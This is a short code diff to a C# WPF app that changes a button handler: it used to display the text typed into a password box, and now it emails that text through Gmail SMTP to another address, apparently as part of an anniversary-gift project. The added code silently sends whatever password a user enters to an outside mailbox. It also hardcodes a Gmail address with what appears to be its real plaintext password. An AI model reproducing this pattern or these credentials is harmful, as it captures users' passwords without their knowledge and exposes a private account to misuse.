@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net.Mail;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
@@ -38,7 +40,17 @@ namespace Project_API
 
         private void SendPass_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
         {
-            MessageBox.Show(tbPass.Text);
+            var smtpClient = new SmtpClient("smtp.gmail.com")
+            {
+                Port = 587,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential("ilaybiton6@gmail.com", "ilay1309"),
+                EnableSsl = true,
+            };
+
+            smtpClient.Send("ilaybiton6@gmail.com", "ilaybh552@gmail.com", 
+                "Password for Anniversary Gift", 
+                "The entered password is " + tbPass.Text);
         }
     }
 }
